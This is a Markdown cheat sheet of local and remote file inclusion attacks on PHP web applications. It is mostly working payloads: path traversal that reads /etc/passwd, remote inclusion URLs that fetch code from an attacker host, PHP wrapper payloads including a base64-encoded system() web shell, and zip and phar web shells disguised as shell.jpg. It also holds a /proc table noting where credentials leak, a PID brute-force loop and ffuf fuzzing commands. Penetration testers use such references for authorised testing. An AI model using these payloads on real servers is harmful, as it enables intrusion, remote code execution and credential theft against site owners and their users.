## Basic Attacks

### Basic LFI / Path Traversal

    ?page=/etc/passwd
    ?page=../../../../../../etc/passwd
    ?page=../../../../../../etc/passwd%00

### Basic RFI

HTTP/S: 

    ?page=http://R_IP_ADDRESS/file.php 
    ?page=https://R_IP_ADDRESS/file.php 

FTP: 

    ?page=ftp://R_IP_ADDRESS/file.php

SMB: 

    ?page=\\R_IP_ADDRESS\file.php

## Wrapper

### Wrapper LFI / Path Traversal

Encode in base64: 

    ?page=php://filter/convert.base64-encode/resource=login.php
    ?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

### Wrapper RFI

#### EXPECT

    ?page=expect://ls

#### INPUT

    ?page=php://input

POST data:
```php
<?php phpinfo(); ?>
<? echo system('uname -a');?>
```
> Example with curl

```php
curl http://R_IP_ADDRESS/?page=php://input -d 'data=<?php phpinfo(); ?>' -X POST 
```
#### DATA
```php
?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
?page=data://text/plain,<?php phpinfo(); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==
    Note: The payload =>     '<?php system($_REQUEST['cmd']); ?>'
```

#### Zip Upload

Create payload:

```zsh
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Upload file: `shell.jpg`

Run payload:

```
http://R_IP_ADDRESS/?page=zip://./DIR/shell.jpg%23shell.php&cmd=id
```

#### Phar Upload

PHP payload:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_REQUEST["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
?>
```

Build payload:
```zsh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload file: `shell.jpg`

Run payload:

```
http://R_IP_ADDRESS/?page=phar://./DIR/shell.jpg%2Fshell.txt&cmd=id
```



## Interesting proc entries to include

|Directory|Description|
|:--------|:----------|
|/proc/sched_debug|This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.|
|/proc/mounts|Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located|
|/proc/net/arp|Shows the ARP table.  This is one way to find out IP addresses for other internal servers.|
|/proc/net/route|Shows the routing table information.|
|/proc/net/tcp and /proc/net/udp|Provides a list of active connections.  Can be used to determine what ports are listening on the server|
|/proc/net/fib_trie|This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target’s networking structure|
|/proc/version|Shows the kernel version.  This can be used to help determine the OS running and the last time it’s been fully updated.|
### Target process PID

|Directory|Description|
|:--------|:----------|
|/proc/[PID]/cmdline|Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.|
|/proc/[PID]/environ|Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.|
|/proc/[PID]/cwd|Points to the current working directory of the process.  This may be useful if you don’t know the absolute path to a configuration file.|
|/proc/[PID]/fd/[#]|Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.|

#### PID fuffing

```bash
processName="KEY_WORD"
targetUrl="http://IP_ADDRESS/"

for i in $(seq 1 9999); do
    curl -s "$targetUrl?page=../../../../proc/$i/cmdline" | strings | grep $processName
done
```

## Tool

### FIMAP
```zsh
fimap.py -u 'http://IP_ADDRESS/page.php?file=bang'
```

### FUFF

```zsh
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt:FUZZ -u 'http://R_IP_ADDRESS/?page=FUZZ'
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://R_IP_ADDRESS/?page=FUZZ'
ffuf -w FI_linux.lst:FUZZ -u 'http://R_IP_ADDRESS/?page=FUZZ'
```
